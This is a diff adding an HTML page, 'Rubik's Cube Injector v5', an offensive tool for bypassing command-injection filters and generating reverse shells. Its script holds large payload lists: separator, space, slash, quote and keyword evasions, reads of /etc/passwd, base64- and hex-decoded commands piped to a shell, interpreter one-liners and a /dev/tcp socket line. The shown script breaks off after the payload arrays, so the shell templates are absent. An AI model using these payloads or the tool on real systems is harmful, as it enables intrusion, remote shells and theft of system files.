@@ -1,0 +1,637 @@
+
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Command injection bypass solver with OS-specific payloads, shell generators, and filter evasion techniques.">
+    <meta name="theme-color" content="#020408">
+<title>Rubik's Cube Injector v5 — Full Solver</title>
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#07070c;--bg2:#0e0e15;--bg3:#161622;--bg4:#1e1e2d;--bg5:#272740;--fg:#cdd0dc;--fg2:#8a8da4;--fg3:#555572;--cyan:#00e5ff;--purple:#9b6dff;--red:#ff3d71;--green:#39d98a;--amber:#ffaa2c;--blue:#4da6ff;--orange:#ff8c42;--teal:#00d4aa;--border:#252540;--radius:5px;--mono:'JetBrains Mono','Fira Code','SF Mono','Cascadia Code','Consolas',monospace}
+html{font-size:13.5px;scroll-behavior:smooth}
+body{background:var(--bg);color:var(--fg);font-family:var(--mono);line-height:1.55;min-height:100vh}
+::selection{background:var(--purple);color:#fff}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--fg3);border-radius:3px}
+.app{max-width:1440px;margin:0 auto;padding:12px 16px}
+header{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);margin-bottom:12px;flex-wrap:wrap}
+header h1{font-size:1.1rem;color:var(--cyan)}header h1 span{color:var(--fg3);font-weight:400;font-size:.8em}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:.6rem;font-weight:700;text-transform:uppercase}
+.badge-ok{background:var(--green);color:#000}
+.pages{display:flex;gap:2px;margin-bottom:12px;background:var(--bg2);border-radius:var(--radius);padding:3px;width:fit-content;flex-wrap:wrap}
+.pg{padding:5px 12px;font-size:.68rem;font-family:var(--mono);border:none;background:transparent;color:var(--fg3);cursor:pointer;border-radius:3px;transition:all .1s}
+.pg:hover{color:var(--fg)}.pg.active{background:var(--bg4);color:var(--cyan);font-weight:600}
+.config{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:end}
+.field{display:flex;flex-direction:column;gap:2px}
+.field label{font-size:.58rem;color:var(--fg3);text-transform:uppercase;letter-spacing:.06em}
+.field input,.field select{background:var(--bg3);border:1px solid var(--border);color:var(--fg);padding:5px 8px;border-radius:var(--radius);font-family:var(--mono);font-size:.76rem;outline:none}
+.field input:focus,.field select:focus{border-color:var(--cyan)}
+.btn{padding:5px 12px;border:1px solid var(--border);background:var(--bg3);color:var(--fg);font-family:var(--mono);font-size:.7rem;border-radius:var(--radius);cursor:pointer;transition:all .1s;white-space:nowrap;display:inline-flex;align-items:center;gap:4px}
+.btn:hover{border-color:var(--cyan);color:var(--cyan)}
+.btn-p{background:var(--cyan);color:#000;border-color:var(--cyan);font-weight:700}
+.btn-g{background:var(--green);color:#000;border-color:var(--green)}
+.btn-r{background:var(--red);color:#fff;border-color:var(--red)}
+.btn-v{background:var(--purple);color:#fff;border-color:var(--purple)}
+.btn-o{background:var(--orange);color:#000;border-color:var(--orange)}
+.btn-s{padding:3px 7px;font-size:.64rem}.btn-xs{padding:2px 5px;font-size:.6rem}
+.sec{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:14px;margin-bottom:12px;display:none}
+.sec.show{display:block}.sec h3{font-size:.8rem;margin-bottom:8px}.sec p{font-size:.72rem;color:var(--fg2);margin-bottom:5px;line-height:1.5}
+.charmap{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:3px;margin:8px 0}
+.char-cell{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:5px 6px;display:flex;align-items:center;gap:5px;transition:all .1s}
+.char-cell.safe{border-color:var(--green);background:rgba(57,217,138,.04)}.char-cell.safe .cc-char{color:var(--green)}
+.char-cell.blocked{border-color:var(--red);background:rgba(255,61,113,.04);opacity:.6}.char-cell.blocked .cc-char{color:var(--red);text-decoration:line-through}
+.cc-char{font-size:.85rem;font-weight:700;min-width:24px;text-align:center;color:var(--amber)}.cc-name{font-size:.58rem;color:var(--fg2);flex:1}.cc-btns{display:flex;gap:2px}
+.profile{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:10px;margin:8px 0}
+.profile h4{font-size:.7rem;color:var(--cyan);margin-bottom:5px;text-transform:uppercase;letter-spacing:.05em}
+.profile-row{display:flex;align-items:baseline;gap:6px;padding:2px 0;font-size:.72rem}.profile-row b{color:var(--amber);min-width:80px}
+.fmap-rows{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg);margin:6px 0}
+.fmap-row{display:flex;align-items:center;gap:5px;padding:4px 8px;border-bottom:1px solid rgba(37,37,64,.4);font-size:.72rem}.fmap-row:last-child{border:none}
+.fmap-tag{font-size:.56rem;color:var(--fg3);min-width:70px;text-transform:uppercase}.fmap-pl{color:var(--amber);word-break:break-all;flex:1}
+.fmap-row.fmap-ok .fmap-pl{color:var(--green)}.fmap-row.fmap-fail{opacity:.35}
+.t-chars{font-size:.56rem;color:var(--purple)}
+/* SOLVER-SPECIFIC */
+.cmd-analysis{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:10px;margin:8px 0;font-size:.78rem;line-height:1.8}
+.cmd-analysis .ch-safe{color:var(--green);font-weight:700}.cmd-analysis .ch-blocked{color:var(--red);font-weight:700;text-decoration:underline;background:rgba(255,61,113,.15);padding:1px 3px;border-radius:2px}
+.cmd-analysis .ch-normal{color:var(--fg)}
+.problems{display:flex;gap:6px;flex-wrap:wrap;margin:6px 0}
+.prob-tag{padding:2px 8px;border-radius:10px;font-size:.62rem;font-weight:600;border:1px solid var(--red);color:var(--red);background:rgba(255,61,113,.06)}
+.safe-tag{border-color:var(--green);color:var(--green);background:rgba(57,217,138,.06)}
+.strat{background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);margin:8px 0;overflow:hidden}
+.strat-head{padding:8px 12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;border-bottom:1px solid var(--border)}
+.strat-head h4{font-size:.74rem;display:flex;align-items:center;gap:6px}
+.strat-head .strat-count{font-size:.6rem;color:var(--fg3)}
+.strat-body{padding:8px 12px;max-height:350px;overflow-y:auto}
+.strat-row{display:flex;align-items:center;gap:5px;padding:3px 0;border-bottom:1px solid rgba(37,37,64,.3);font-size:.72rem}.strat-row:last-child{border:none}
+.strat-label{font-size:.56rem;color:var(--fg3);min-width:90px;flex-shrink:0}
+.strat-payload{color:var(--green);word-break:break-all;flex:1;user-select:all;cursor:text}
+.shell-out{background:var(--bg);border:1px solid var(--border);border-radius:3px;padding:10px;font-size:.78rem;word-break:break-all;color:var(--green);margin:8px 0;white-space:pre-wrap}
+.shell-cfg{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin:8px 0}
+.toast{position:fixed;bottom:12px;right:12px;background:var(--bg3);border:1px solid var(--cyan);color:var(--cyan);padding:6px 12px;border-radius:var(--radius);font-size:.72rem;transform:translateY(60px);opacity:0;transition:all .2s;z-index:999;pointer-events:none}.toast.show{transform:translateY(0);opacity:1}
+.qa{padding:5px 10px;border-radius:var(--radius);margin-bottom:8px;font-size:.66rem;display:none}.qa.pass{display:block;background:rgba(57,217,138,.05);border:1px solid var(--green);color:var(--green)}
+@media(max-width:700px){.app{padding:8px}.charmap{grid-template-columns:repeat(auto-fill,minmax(100px,1fr))}}
+</style>
+
+<style id="mahdiesta-theme-style">
+:root {
+  --mah-bg: #020408;
+  --mah-bg-elevated: #080c14;
+  --mah-bg-card: #0d111c;
+  --mah-text: #e2e8f0;
+  --mah-text-secondary: #94a3b8;
+  --mah-border: #1e2740;
+  --mah-accent: #22d3ee;
+}
+[data-theme="light"] {
+  --mah-bg: #f8fafc;
+  --mah-bg-elevated: #ffffff;
+  --mah-bg-card: #ffffff;
+  --mah-text: #0f172a;
+  --mah-text-secondary: #475569;
+  --mah-border: #e2e8f0;
+  --mah-accent: #0891b2;
+}
+html, body {
+  background: var(--mah-bg) !important;
+  color: var(--mah-text) !important;
+}
+#theme-toggle-btn {
+  position: fixed;
+  bottom: 1rem;
+  right: 1rem;
+  z-index: 9999;
+  width: 40px;
+  height: 40px;
+  border-radius: 10px;
+  border: 1px solid var(--mah-border);
+  background: var(--mah-bg-card);
+  color: var(--mah-text-secondary);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  transition: all 0.25s ease;
+}
+#theme-toggle-btn:hover {
+  border-color: var(--mah-accent);
+  color: var(--mah-accent);
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <header>
+    <h1>&#11035; Rubik's Cube Injector <span>v5 // Full Solver</span></h1>
+    <div id="qa-badge"></div>
+  </header>
+  <div id="qa" class="qa"></div>
+  <div class="pages">
+    <button class="pg active" data-pg="fingerprint">1. Fingerprint</button>
+    <button class="pg" data-pg="profile">2. Profile</button>
+    <button class="pg" data-pg="discover">3. Discover</button>
+    <button class="pg" data-pg="solve">4. &#x1F9E9; SOLVER</button>
+    <button class="pg" data-pg="shell">5. Shell</button>
+    <button class="pg" data-pg="ref">Ref</button>
+  </div>
+  <div class="config">
+    <div class="field"><label>Base Value</label><input type="text" id="cfg-base" value="127.0.0.1" style="width:120px"></div>
+    <div class="field"><label>OS</label><select id="cfg-os"><option value="linux">Linux</option><option value="windows">Windows</option><option value="powershell">PS</option><option value="all">All</option></select></div>
+    <div class="field"><label>OOB</label><input type="text" id="cfg-oob" placeholder="xxxxx.oast.fun" style="width:130px"></div>
+    <button class="btn btn-p" onclick="resetAll()">&#8635; Reset</button>
+  </div>
+
+  <!-- P1: FINGERPRINT -->
+  <div class="sec show" id="pg-fingerprint">
+    <h3 style="color:var(--orange)">&#x1F50D; Step 1: Character Fingerprint</h3>
+    <p>One Intruder run: tests every special character individually. Sort by length to see what's blocked.</p>
+    <div style="display:flex;gap:5px;flex-wrap:wrap;margin:6px 0">
+      <button class="btn btn-o btn-s" onclick="genCharProbes()">&#x1F4CB; Copy Probe Wordlist</button>
+      <button class="btn btn-s" onclick="dlCharProbes()">&#x2B07;</button>
+      <button class="btn btn-xs btn-g" onclick="markAllChars('safe')">All Safe</button>
+      <button class="btn btn-xs btn-r" onclick="markAllChars('blocked')">All Blocked</button>
+    </div>
+    <div class="charmap" id="charmap"></div>
+    <button class="btn btn-p" onclick="goPage('profile')" style="margin-top:8px">Next &#8594;</button>
+  </div>
+
+  <!-- P2: PROFILE -->
+  <div class="sec" id="pg-profile">
+    <h3 style="color:var(--teal)">&#x1F9EC; Step 2: Filter Profile</h3>
+    <div id="profile-body"></div>
+    <div style="margin-top:8px;display:flex;gap:5px"><button class="btn btn-p" onclick="goPage('discover')">Next &#8594;</button><button class="btn btn-s" onclick="copyProfile()">&#x1F4CB; Copy</button></div>
+  </div>
+
+  <!-- P3: DISCOVER -->
+  <div class="sec" id="pg-discover">
+    <h3 style="color:var(--amber)">&#x26A1; Step 3: Discover Bypasses</h3>
+    <p>Only techniques whose characters are NOT blocked. Paste into Intruder, mark what works.</p>
+    <div style="display:flex;gap:3px;flex-wrap:wrap;margin:6px 0" id="dim-tabs"></div>
+    <div style="display:flex;gap:5px;flex-wrap:wrap;margin:4px 0" id="dim-acts"></div>
+    <div id="dim-body"></div>
+    <button class="btn btn-p" onclick="goPage('solve')" style="margin-top:8px">Next: SOLVER &#8594;</button>
+  </div>
+
+  <!-- P4: RUBIK'S CUBE SOLVER -->
+  <div class="sec" id="pg-solve">
+    <h3 style="color:var(--green)">&#x1F9E9; Step 4: Rubik's Cube Command Solver</h3>
+    <p>Enter ANY command. The solver analyzes every character, identifies all problems, then generates multi-layer bypass strategies — like solving a Rubik's Cube face by face.</p>
+    <div id="solve-confirmed" style="margin:6px 0"></div>
+    <div style="display:flex;gap:8px;margin:8px 0;flex-wrap:wrap;align-items:end">
+      <div class="field" style="flex:1;min-width:250px"><label>Command to Inject</label>
+        <input type="text" id="solve-cmd" placeholder="find /usr/share/ | grep root | grep mysql | tail -n 1" style="padding:10px;font-size:.9rem;border-color:var(--green)">
+      </div>
+      <button class="btn btn-g" onclick="solveCube()" style="padding:10px 20px">&#x1F9E9; SOLVE</button>
+    </div>
+    <!-- Analysis -->
+    <div id="solve-analysis" style="display:none"></div>
+    <!-- Strategies -->
+    <div id="solve-strategies"></div>
+    <!-- Master wordlist -->
+    <div id="solve-master" style="display:none"></div>
+  </div>
+
+  <!-- P5: SHELL -->
+  <div class="sec" id="pg-shell">
+    <h3 style="color:var(--green)">&#x1F41A; Step 5: Reverse Shell</h3>
+    <div class="shell-cfg">
+      <div class="field"><label>IP</label><input type="text" id="shell-ip" placeholder="10.10.14.1"></div>
+      <div class="field"><label>Port</label><input type="text" id="shell-port" value="4444"></div>
+      <div class="field"><label>Template</label><select id="shell-tpl"></select></div>
+    </div>
+    <div style="display:flex;gap:5px;margin-top:6px;flex-wrap:wrap"><button class="btn btn-p" onclick="genShell()">Generate</button><button class="btn btn-s" onclick="cpS()">&#x1F4CB;</button><button class="btn btn-s" onclick="cpSU()">url</button><button class="btn btn-s" onclick="cpSB()">b64</button></div>
+    <div class="shell-out" id="shell-out" style="display:none"></div>
+  </div>
+
+  <!-- REF -->
+  <div class="sec" id="pg-ref">
+    <h3 style="color:var(--purple)">&#x1F4DA; Full Reference</h3>
+    <div style="display:flex;gap:3px;flex-wrap:wrap;margin:6px 0" id="ref-tabs"></div>
+    <div id="ref-body"></div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+<script>
+/* ═══════════════════════════════════════════════════════════
+   ALL 15 DATABASES — 227 TECHNIQUES — chars[] ON EVERY ENTRY
+   ═══════════════════════════════════════════════════════════ */
+var SEPARATORS=[{id:'semi',val:';',priority:5,contexts:['linux'],note:'Standard separator',chars:[';']},{id:'newline',val:'%0a',priority:1,contexts:['all'],note:'HTB: usually NOT blacklisted',chars:[]},{id:'cr',val:'%0d',priority:3,contexts:['all'],chars:[]},{id:'crlf',val:'%0d%0a',priority:3,contexts:['all'],chars:[]},{id:'pipe',val:'|',priority:4,contexts:['all'],chars:['|']},{id:'amp',val:'&',priority:5,contexts:['all'],chars:['&']},{id:'and',val:'&&',priority:6,contexts:['all'],chars:['&']},{id:'or',val:'||',priority:6,contexts:['all'],chars:['|']},{id:'backtick',val:'`',priority:7,contexts:['all'],inline:true,chars:['`']},{id:'subshell',val:'$()',priority:7,contexts:['all'],inline:true,chars:['$','(',')']},{id:'ls_colors',val:'${LS_COLORS:10:1}',priority:2,contexts:['linux'],note:'HTB: extracts ; from env',chars:['$','{','}']},{id:'dollar_brace',val:'${}',priority:8,contexts:['all'],chars:['$','{','}']},{id:'hash',val:'#',priority:9,contexts:['all'],note:'Comment truncation',chars:['#']},{id:'win_rem',val:'REM',priority:10,contexts:['windows'],chars:[]},{id:'win_colon',val:'::',priority:10,contexts:['windows'],chars:[]},{id:'sql_dash',val:'--',priority:11,contexts:['all'],chars:[]},{id:'c_comment',val:'/* */',priority:11,contexts:['all'],chars:['/']},{id:'null_byte',val:'%00',priority:12,contexts:['all'],chars:[]},{id:'hex_null',val:'\\x00',priority:12,contexts:['all'],chars:['\\']},{id:'raw_newline',val:'\\n',priority:2,contexts:['all'],chars:['\\']},{id:'raw_cr',val:'\\r',priority:3,contexts:['all'],chars:['\\']},{id:'raw_crlf',val:'\\r\\n',priority:3,contexts:['all'],chars:['\\']},{id:'double_semi',val:'%253b',priority:4,contexts:['all'],note:'Double URL encoded',chars:[]},{id:'double_newline',val:'%250a',priority:2,contexts:['all'],note:'Double URL encoded',chars:[]},{id:'double_pipe',val:'%257c',priority:5,contexts:['all'],chars:[]},{id:'double_amp',val:'%2526',priority:6,contexts:['all'],chars:[]}];
+var SPACE_BYPASSES=[{id:'literal',val:' ',priority:10,chars:[' ']},{id:'ifs',val:'${IFS}',priority:1,contexts:['linux'],note:'HTB: most reliable',chars:['$','{','}']},{id:'ifs_simple',val:'$IFS',priority:2,contexts:['linux'],chars:['$']},{id:'ifs9',val:'$IFS$9',priority:2,contexts:['bash'],chars:['$']},{id:'ifs_sub',val:'${IFS:0:1}',priority:3,contexts:['bash'],chars:['$','{','}']},{id:'ifs_pattern',val:'${IFS%%[a-z]*}',priority:4,contexts:['bash'],chars:['$','{','}']},{id:'tab',val:'%09',priority:1,contexts:['all'],note:'Cross-platform',chars:[]},{id:'newline_space',val:'%0a',priority:3,contexts:['all'],chars:[]},{id:'vtab',val:'%0b',priority:5,contexts:['all'],chars:[]},{id:'brace',val:'{a,b}',priority:1,contexts:['bash'],note:'HTB: eliminates spaces',special:'brace_expansion',chars:['{','}']},{id:'redirect',val:'<',priority:7,chars:['<']},{id:'ansi_c',val:"$'\\x20'",priority:4,contexts:['bash'],chars:['$',"'",'\\']},{id:'var_concat',val:'a=/path;cmd$a',priority:6,chars:[';','$']},{id:'tilde',val:'~',priority:8,contexts:['linux'],chars:['~']},{id:'unicode_nbsp',val:'%C2%A0',priority:9,chars:[]},{id:'unicode_em',val:'%E2%80%83',priority:9,chars:[]},{id:'win_substr',val:'%CommonProgramFiles:~10,-18%',priority:8,contexts:['windows'],chars:[]},{id:'random_null',val:'${RANDOM:0:0}',priority:6,contexts:['bash'],chars:['$','{','}']},{id:'undefined_var',val:'${Z}',priority:6,contexts:['bash'],chars:['$','{','}']},{id:'backslash_newline',val:'\\%0A',priority:5,chars:['\\']}];
+var SLASH_BYPASSES=[{id:'literal',val:'/',priority:10,chars:['/']},{id:'path01',val:'${PATH:0:1}',priority:1,contexts:['linux'],note:'HTB: first char of $PATH',chars:['$','{','}']},{id:'home01',val:'${HOME:0:1}',priority:2,contexts:['linux'],chars:['$','{','}']},{id:'pwd01',val:'${PWD:0:1}',priority:3,contexts:['linux'],chars:['$','{','}']},{id:'shell01',val:'${SHELL:0:1}',priority:4,contexts:['linux'],chars:['$','{','}']},{id:'ls_colors_sub',val:'${LS_COLORS:10:1}',priority:2,contexts:['linux'],chars:['$','{','}']},{id:'tr_shift',val:'$(tr "!-}" "\\""-~"<<<.)',priority:5,chars:['$','(',')']},{id:'tr_cmd',val:'$(echo . | tr "!-0" "\\""-1")',priority:6,chars:['$','(',')','|']},{id:'wildcard_q',val:'?',priority:7,chars:['?']},{id:'wildcard_star',val:'*',priority:8,chars:['*']},{id:'brace_expand',val:'{,/?s?/?i?/c?t,/e??/p??s??,}',priority:9,contexts:['bash'],chars:['{','}']},{id:'url',val:'%2f',priority:11,chars:[]},{id:'double_url',val:'%252f',priority:12,chars:[]},{id:'unicode_slash',val:'\u2215',priority:13,chars:[]},{id:'unicode_hex',val:'%E2%88%95',priority:13,chars:[]},{id:'var_concat',val:'a=etc;b=passwd;cat /$a/$b',priority:6,chars:['$',';']},{id:'input_redir',val:'cat</etc/passwd',priority:7,chars:['<']},{id:'echo_trick',val:'echo / | tr -d "/"',priority:8,chars:['|','"']},{id:'seq_trick',val:'seq -s/ 1 1',priority:9,chars:['/']},{id:'win_forward',val:'C:/Users',priority:5,contexts:['windows'],chars:['/']},{id:'win_homepath',val:'%HOMEPATH:~6,-11%',priority:4,contexts:['windows'],chars:[]},{id:'win_path',val:'%PATH:~0:1%',priority:5,contexts:['windows'],chars:[]},{id:'win_progfiles',val:'%ProgramFiles:~10:1%',priority:6,contexts:['windows'],chars:[]},{id:'ps_env_index',val:'$env:HOMEPATH[0]',priority:4,contexts:['powershell'],chars:['$']},{id:'ps_char_cast',val:'[char]92',priority:5,contexts:['powershell'],chars:['[',']']},{id:'ps_join',val:'-join ([char[]](92))',priority:6,contexts:['powershell'],chars:['[',']','(',')']},{id:'ps_format',val:'"{0}" -f [char]92',priority:7,contexts:['powershell'],chars:['"','[',']']}];
+var DOLLAR_BYPASSES=[{id:'url',val:'%24',priority:1,chars:[]},{id:'double_url',val:'%2524',priority:2,chars:[]},{id:'hex',val:'\\x24',priority:3,chars:['\\']},{id:'ansi_hex',val:"$'\\x24'",priority:3,contexts:['bash'],chars:['$',"'",'\\']},{id:'backtick_alt',val:'`cmd`',priority:4,chars:['`']},{id:'literal_quote',val:"echo 'value'",priority:5,chars:["'"]},{id:'brace_only',val:'{cmd,arg}',priority:6,chars:['{','}']},{id:'base64_full',val:'echo BASE64 | base64 -d | sh',priority:7,chars:['|']},{id:'double_dollar',val:'$$',priority:8,chars:['$']},{id:'null_sub',val:'${VAR:0:0}',priority:9,chars:['$','{','}']}];
+var QUOTE_BYPASSES=[{id:'url_single',val:'%27',priority:1,chars:[]},{id:'url_double',val:'%22',priority:1,chars:[]},{id:'split_single',val:"w'h'o'am'i",priority:2,chars:["'"]},{id:'split_double',val:'w"h"o"am"i',priority:2,chars:['"']},{id:'escape_backtick',val:'wh\\`oami',priority:3,chars:['\\','`']},{id:'concat_single',val:"'part1'\"'\"'part2'",priority:4,chars:["'",'"']},{id:'ansi_single',val:"$'\\x27'",priority:5,chars:['$',"'",'\\']},{id:'ansi_double',val:"$'\\x22'",priority:5,chars:['$',"'",'\\']},{id:'here_doc',val:'cat << EOF',priority:6,chars:['<']},{id:'echo_escape',val:'echo -e',priority:7,chars:[]},{id:'win_caret_single',val:"^'",priority:8,contexts:['windows'],chars:['^',"'"]},{id:'win_caret_double',val:'^"',priority:8,contexts:['windows'],chars:['^','"']}];
+var BACKSLASH_LINUX=[{id:'split',val:'w\\ho\\am\\i',priority:1,chars:['\\']},{id:'path_obf',val:'/\\b\\i\\n/////s\\h',priority:2,chars:['\\','/']},{id:'tr_shift',val:"$(tr '!-}' '\"\"-~'<<<[)",priority:3,chars:['$','(',')']},{id:'ansi_hex',val:"$'\\x5c'",priority:4,chars:['$',"'",'\\']},{id:'url',val:'%5c',priority:5,chars:[]},{id:'double_url',val:'%255c',priority:6,chars:[]},{id:'octal',val:"$'\\134'",priority:7,chars:['$',"'",'\\']},{id:'printf',val:'printf "\\\\x5c"',priority:8,chars:['"','\\']},{id:'var_store',val:'x=\\; cmd$x',priority:9,chars:['\\',';','$']}];
+var BACKSLASH_WIN_CMD=[{id:'homepath_sub',val:'%HOMEPATH:~6,-11%',priority:1,chars:[]},{id:'path_sub',val:'%PATH:~0:1%',priority:2,chars:[]},{id:'progfiles_sub',val:'%ProgramFiles:~10:1%',priority:3,chars:[]},{id:'set_discovery',val:'set | findstr \\',priority:4,chars:['|','\\']},{id:'caret_escape',val:'^\\',priority:5,chars:['^','\\']},{id:'url',val:'%5c',priority:6,chars:[]},{id:'double_url',val:'%255c',priority:7,chars:[]},{id:'forward_alt',val:'dir C:/Users',priority:8,chars:['/']},{id:'var_concat',val:'set a=\\ & echo %a%',priority:9,chars:['\\','&']},{id:'for_loop',val:'for %i in (\\) do echo %i',priority:10,chars:['\\','(',')']}];
+var BACKSLASH_PS=[{id:'env_index',val:'$env:HOMEPATH[0]',priority:1,chars:['$','[',']']},{id:'env_index_2',val:'$env:PROGRAMFILES[10]',priority:2,chars:['$','[',']']},{id:'gci_env',val:'gci Env: | Where Value -like "*\\*"',priority:3,chars:['|','\\','"']},{id:'char_cast',val:'[char]92',priority:4,chars:['[',']']},{id:'join_array',val:'-join ([char[]](92))',priority:5,chars:['[',']','(',')']},{id:'format_op',val:'"{0}" -f [char]92',priority:6,chars:['"','[',']']},{id:'ansi_hex',val:"$'\\x5c'",priority:7,chars:['$',"'",'\\']},{id:'url',val:'%5c',priority:8,chars:[]},{id:'string_split',val:'"C:Users".Split(\':\')[1]',priority:9,chars:['"',"'",'[',']']},{id:'iex',val:'iex ([char]92)',priority:10,chars:['(',')','[',']']}];
+var SEMICOLON_BYPASSES=[{id:'ls_colors',val:'${LS_COLORS:10:1}',priority:1,contexts:['linux'],chars:['$','{','}']},{id:'printenv',val:'printenv | grep -o \'.\'',priority:2,chars:['|']},{id:'tr_shift',val:"$(tr '!-~' '\"\"-_'<<<:)",priority:3,chars:['$','(',')']},{id:'ansi_hex',val:"$'\\x3b'",priority:4,chars:['$',"'",'\\']},{id:'url',val:'%3b',priority:5,chars:[]},{id:'double_url',val:'%253b',priority:6,chars:[]},{id:'alt_and',val:'cmd && other',priority:7,chars:['&']},{id:'alt_or',val:'cmd || other',priority:7,chars:['|']},{id:'alt_pipe',val:'cmd | other',priority:8,chars:['|']},{id:'newline_inj',val:'cmd%0aother',priority:1,chars:[]},{id:'cr_inj',val:'cmd%0dother',priority:2,chars:[]},{id:'backtick_sep',val:'`cmd`',priority:3,chars:['`']},{id:'subshell_sep',val:'$(cmd)',priority:3,chars:['$','(',')']},{id:'here_string',val:'bash <<< "cmd"',priority:4,contexts:['bash'],chars:['<','"']}];
+var CHAR_SHIFTING=[{id:'tr_range',val:"$(tr 'A-Z' 'B-Z['<<<A)",priority:1,chars:['$','(',')']},{id:'man_ascii',val:'man ascii',priority:2,chars:[]},{id:'ps_char_math',val:"[char]([byte][char]'[' + 1)",priority:3,contexts:['powershell'],chars:['[',']','(',')']},{id:'python_chr',val:'python -c "print(chr(92))"',priority:4,chars:['"']},{id:'perl_chr',val:'perl -e "print chr(92)"',priority:5,chars:['"']},{id:'ruby_chr',val:'ruby -e "print 92.chr"',priority:6,chars:['"']},{id:'bash_printf',val:'printf "\\\\x5c"',priority:7,chars:['"','\\']},{id:'bash_echo',val:'echo -e "\\\\x5c"',priority:8,chars:['"','\\']},{id:'arithmetic',val:'$((92))',priority:9,contexts:['bash'],chars:['$','(',')']},{id:'octal_escape',val:"$'\\134'",priority:10,contexts:['bash'],chars:['$',"'",'\\']},];
+var KEYWORD_OBFUSCATION=[{id:'quote_single',val:"w'h'o'am'i",priority:1,note:'Single-quote split',chars:["'"]},{id:'quote_double',val:'w"h"o"am"i',priority:1,note:'Double-quote split',chars:['"']},{id:'dollar_at',val:'who$@ami',priority:2,contexts:['linux'],chars:['$']},{id:'backslash_mid',val:'w\\ho\\am\\i',priority:2,contexts:['linux'],chars:['\\']},{id:'win_caret',val:'who^ami',priority:3,contexts:['windows'],chars:['^']},{id:'win_case',val:'WhOaMi',priority:4,contexts:['windows'],chars:[]},{id:'tr_case',val:'$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")',priority:5,contexts:['linux'],chars:['$','(',')']},{id:'bash_param',val:'$(a="WhOaMi";printf %s "${a,,}")',priority:6,contexts:['bash'],chars:['$','(',')']},{id:'rev_cmd',val:"$(rev<<<'imaohw')",priority:7,contexts:['linux'],chars:['$','(',')']},{id:'ps_rev',val:"iex \"$('imaohw'[-1..-20] -join '')\"",priority:8,contexts:['powershell'],chars:['"','$']},{id:'base64_bash',val:"bash<<<$(base64 -d<<<ENCODED)",priority:9,contexts:['linux'],chars:['$','(',')']},{id:'base64_eval',val:"eval $(base64 -d<<<ENCODED)",priority:9,chars:['$','(',')']},{id:'hex_xxd',val:"xxd -r -p <<< HEX | bash",priority:10,chars:['|','<']},{id:'hex_printf',val:"printf '\\xHEX' | bash",priority:10,chars:["'",'\\','|']},{id:'ps_base64',val:"[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('cmd'))",priority:11,contexts:['powershell'],chars:['[',']',"'"]},{id:'var_concat',val:'a=who;b=ami;$a$b',priority:12,chars:[';','$']},{id:'ifs_concat',val:'IFS=.;c=ca$t;$c',priority:13,chars:[';','$']},{id:'positional',val:'set -- whoami; "$@"',priority:14,chars:[';','"','$']},{id:'eval_recon',val:'cmd=whoami;eval $cmd',priority:15,chars:[';','$']},{id:'wildcard_q',val:'/bin/c?t /etc/passwd',priority:16,chars:['/','?']},{id:'wildcard_star',val:'/bin/c* /etc/passwd',priority:17,chars:['/','*']},{id:'integer_exp',val:'{1..1}whoami',priority:18,contexts:['bash'],chars:['{','}']},{id:'here_doc',val:'bash << EOF\nwhoami\nEOF',priority:19,chars:['<']},{id:'here_string',val:'bash <<< whoami',priority:20,chars:['<']},{id:'python_one',val:'python -c \'import os;os.system("cmd")\'',priority:21,chars:["'",'"',';']},{id:'perl_one',val:'perl -e \'system("cmd")\'',priority:22,chars:["'",'"']},{id:'ruby_one',val:'ruby -e \'system("cmd")\'',priority:23,chars:["'",'"']},{id:'lua_one',val:'lua -e \'os.execute("cmd")\'',priority:24,chars:["'",'"']},{id:'env_exec',val:'env cmd',priority:25,chars:[]},{id:'exec_trick',val:'exec 3<>/dev/tcp/127.0.0.1/4444',priority:26,chars:['<','>','/']},{id:'nohup',val:'nohup cmd > /dev/null &',priority:27,chars:['>','/','&']},{id:'setsid',val:'setsid cmd',priority:28,chars:[]},{id:'timeout',val:'timeout 5 cmd',priority:29,chars:[]},{id:'nice',val:'nice -n 10 cmd',priority:30,chars:[]},{id:'read_here',val:'read a<<<cmd;$a',priority:31,chars:['<',';','$']},{id:'trap_exit',val:'trap "cmd" EXIT; exit',priority:32,chars:['"',';']},{id:'history_exp',val:'!cmd',priority:33,chars:['!']},{id:'eval_concat',val:'eval wh""oami',priority:34,chars:['"']},{id:'printf_exec',val:'printf "%s" "cmd" | bash',priority:35,chars:['"','|']}];
